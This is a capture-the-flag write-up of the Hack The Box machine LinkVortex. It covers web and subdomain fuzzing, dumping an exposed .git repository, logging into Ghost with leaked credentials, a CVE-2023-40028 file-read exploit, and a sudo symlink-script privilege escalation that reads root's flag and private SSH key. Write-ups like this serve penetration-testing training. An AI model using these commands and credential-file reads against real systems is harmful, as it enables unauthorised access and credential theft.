+++
title = "Linkvortex - HTB Machine"
date = "2025-04-09"
weight = 0
[taxonomies]
tags=["HTB", "Machine", "git-dumper", "docker", "ghost"]
difficulty=["easy"]
writeup=["HTB-machine"]
os=["linux"]
+++


# Recon

## Web Discovery

nmap:

```bash
└─$ cat nmap/linkvortex.nmap 
# Nmap 7.95 scan initiated Wed Apr  9 14:19:10 2025 as: /usr/lib/nmap/nmap -sC -sV -vv -oA nmap/linkvortex 10.129.24.144
Nmap scan report for 10.129.24.144
Host is up, received echo-reply ttl 63 (0.12s latency).
Scanned at 2025-04-09 14:19:11 EDT for 11s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  9 14:19:22 2025 -- 1 IP address (1 host up) scanned in 12.31 seconds
```

We see:
```
|_http-title: Did not follow redirect to http://linkvortex.htb/
```
So add that to the `/etc/hosts` file


Visiting the site, we can see from the footer below that it is running **Ghost**:
```HTML
<div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
```
Which is an open-source blog CMS.

However I could not find anything out of the ordinary with `ffuf` using different wordlists:


```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://linkvortex.htb/FUZZ -fs 0
....
....
....
....

assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 126ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 118ms]
LICENSE                 [Status: 200, Size: 1065, Words: 149, Lines: 23, Duration: 136ms]
partials
```

Or with `feroxbuster` with some of its dynamic features:

```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/tmp]
└─$ feroxbuster -u http://linkvortex.htb/                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://linkvortex.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w      204c http://linkvortex.htb/ghost/api
....
```

However if we remove the `api` from the URL above, we get `http://linkvortex.htb/ghost` which is a login page.

I tried bruteforcing `admin` or `admin@linkvortex.htb` with `rockyou.txt` but I quickly realized that i got rate-limited.

## Subdomain Discovery

Moving on to subdomain enumeration:

```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb"  -fs 230

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 230
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 125ms]
```

We have a hit. So let's enumerate the **dev** subdomain: `dev.linkvortex.htb`

I tried initially with a wordlist: `raft-large-directories.txt`, but I did not disclose anything. However, given that this site is WIP, it would make sense to use a *"files"* wordlist. And so I did:

## Dumping `.git`

```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/tmp]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u http://dev.linkvortex.htb/FUZZ -fs 0 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 126ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 119ms]
.                       [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 117ms]
.html                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 119ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 124ms]
.htm                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 120ms]
.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 120ms]
.htpasswds              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 116ms]
.htgroup                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 122ms]
.htaccess.bak           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 120ms]
```

**🚨 .git Directory Found!**

We can use `git-dumper` to dump the code:

```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex]
└─$ git-dumper http://dev.linkvortex.htb/ git_dump     
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

Since this is a `.git` directory that we have dumped, there might very well be some staged changes. We can see that with:


```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/git_dump]
└─$ git status                                       
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

So lets do a diff on the local changes and see what we might find:

```diff
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/git_dump]
└─$ git diff --cached
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')
```

We have: 
- Some possible credentials: `test@example.com:OctopiFociPilfer45`
- Dockerfile for the "production" code: `Dockerfile.ghost`



I tried to ssh `SSH` with the password, but no luck.

Lets try them on the first page, at the login page I found earlier 

Navigating to `http://linkvortex.htb/ghost`, I try these credentials:

- `test@example.com:OctopiFociPilfer45` - Does not work!
- `admin@linkvortex.htb:OctopiFociPilfer45` - Does work!

And we're in!

# Shell as Bob

We are shown a dashboard of the *Ghost* app

![Ghost](/imgs/htb/linkvortex/image.png)


Lets see if we can identify the version of **ghost**. I always try this as the first thing, when I get onto a site to see if there's any CVE pertaining to the version of the service.

![ghost.png](/imgs/htb/linkvortex/ghost.png)

We can see that the version of **Ghost** is `5.58.0`, which is vulnerable to `CVE-2023-40028`, a *Arbitrary File Read* Exploit.

Background of the CVE:
> Ghost is an open source content management system. Versions prior to 5.59.1 are subject to a vulnerability which allows authenticated users to upload files that are symlinks. This can be exploited to perform an arbitrary file read of any file on the host operating system. Site administrators can check for exploitation of this issue by looking for unknown symlinks within Ghost's `content/` folder. Version 5.59.1 contains a fix for this issue. All users are advised to upgrade. There are no known workarounds for this vulnerability. 

Searching for an exploit I found: [Ghost Arbitrary File Read Exploit (CVE-2023-40028) By 0xDTC (Github) ](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)

We just run it like this:
```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex]
└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): <FILE>
```

So how can we leverage this to find some credentials and get a shell as a user?

`/etc/passwd`:
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

This only says that the `node` user exists, since it is running inside a container. But remember the `diff` we did earlier, on the git dump, that we saw:

```diff
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
```

So looking at that file we get:

`/var/lib/ghost/config.production.json`:
```json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

We have some new creds!

Looking back at the `/etc/passwd` from before, we had a `node` user:
```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex]
└─$ ssh node@linkvortex.htb 
```
But that fails. They were storing creds for a user outside the container.

So lets try the username from the `"user"`-entry:
```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex]
└─$ ssh bob@linkvortex.htb
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ wc user.txt 
 1  1 33 user.txt
```
And we're in!


# Root

Especially for easy boxes I always do `sudo -l` before doing any enumeration, and we have a hit:

```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Before looking at the script, lets state what we might be able to exploit:
- `ENV_KEEP+=CHECK_CONTENT` - We can keep an environment variable while executing as `root`
- `../clean_symlink.sh *.png` - We can exploit wildcard expansions



```bash
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

So how can we exploit that?

We can double link it and use the `CHECK_CONTENT` to print the contents of any file we want.

```bash
bob@linkvortex:~$ ln -fs /root/root.txt link
bob@linkvortex:~$ ln -fs link cute_puppy.png
bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh cute_puppy.png
Link found [ cute_puppy.png ] , moving it to quarantine
Content:
bob@linkvortex:~$ ln -fs /root/root.txt link
bob@linkvortex:~$ ln -fs /home/bob/link cute_puppy.png
bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh cute_puppy.png
Link found [ cute_puppy.png ] , moving it to quarantine
Content:
4990........................9f83
```

Note that this has atleast two other vulnerabilies:
- The `CHECK_CONTENT` can be set to a binary, since the script does not enforce it to be when evaluating it, whic could lead us to run a script as root!
- There a Race Condition vulnerability in the conditional branch on `$LINK_TARGET`

I recommend seeing Ippsecs video or read 0xdf write-up (I did not look further for these when solving the box while it was active. But read after its retirement :) )

## Getting root shell

Sometimes I like to see if I can actually get a shell, and not just the flag. I find it kind of gimmicky too CTF-like if we cannot get a real shell on `root`. File disclosure does not always equal account 

However, the root user has a private SSH key, that we can read the same way as before.

```bash
bob@linkvortex:~$ ln -fs /root/.ssh/id_rsa link
bob@linkvortex:~$ ln -fs /home/bob/link cute_puppy.png
bob@linkvortex:~$ CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh cute_puppy.png
Link found [ cute_puppy.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    ....................................................
    ....................................................
    ....................................................
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Then i just paste the private key into my kali host machine

```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/ssh]
└─$ vim id_rsa                                                                                      
```

Remember to give it the right permissions, otherwise it will fail like:
```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/ssh]
└─$ ssh -i id_rsa root@linkvortex.htb 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
....
```
So just:
```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/ssh]
└─$ chmod 700 id_rsa   
```
And we're in!
```bash
┌──(kali㉿kali)-[~/htb/boxes/linkvortex/ssh]
└─$ ssh -i id_rsa root@linkvortex.htb 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~# ls
root.txt
root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# Wrap

## Tools 
- `ffuf` 
- `feroxbuster`
- `git-dumper`
- `nmap`
- `burp` & `foxyproxy`
- `ln -s`

## Key take-aways
- Remember enumerate subdomains
- Note your findings (Forgotting the `.json` file, when enumerating the file system as `node`)
- Be vary of rate limiting
- try one more layer/link (Especially when symlinks are involved)
